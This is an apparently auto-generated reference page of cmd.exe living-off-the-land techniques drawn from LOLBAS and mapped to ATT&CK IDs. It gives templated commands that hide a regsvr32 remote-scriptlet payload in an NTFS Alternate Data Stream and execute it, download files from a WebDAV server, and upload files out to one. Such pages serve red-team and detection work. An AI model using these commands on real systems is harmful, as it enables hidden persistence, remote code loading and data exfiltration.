---
parsed_by: focuslocust
source: commands
type: generated
---
# Cmd Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## Cmd.exe

Tool page: [Cmd.exe](../../tools/windows/cmd.exe.md)

### Can be used to evade defensive countermeasures or to hide as a persistence mechanism

```text
cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:{REMOTEURL:.sct} ^scrobj.dll > {PATH}:payload.bat
```

Description:

Add content to an Alternate Data Stream (ADS).

Related ATT&CK:

- [T1564.004](../../attack/techniques/T1564.004-ntfs-file-attributes.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Cmd.yml` |
| Evidence | Command preserved from source parser. |

### Can be used to evade defensive countermeasures or to hide as a persistence mechanism

```text
cmd.exe - < {PATH}:payload.bat
```

Description:

Execute payload.bat stored in an Alternate Data Stream (ADS).

Related ATT&CK:

- [T1059.003](../../attack/techniques/T1059.003-windows-command-shell.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Cmd.yml` |
| Evidence | Command preserved from source parser. |

### Download/copy a file from a WebDAV server

```text
type {PATH_SMB} > {PATH_ABSOLUTE}
```

Description:

Downloads a specified file from a WebDAV server to the target file.

Related ATT&CK:

- [T1105](../../attack/techniques/T1105-ingress-tool-transfer.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Cmd.yml` |
| Evidence | Command preserved from source parser. |

### Upload a file to a WebDAV server

```text
type {PATH_ABSOLUTE} > {PATH_SMB}
```

Description:

Uploads a specified file to a WebDAV server.

Related ATT&CK:

- [T1048.003](../../attack/techniques/T1048.003-exfiltration-over-unencrypted-non-c2-protocol.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Cmd.yml` |
| Evidence | Command preserved from source parser. |
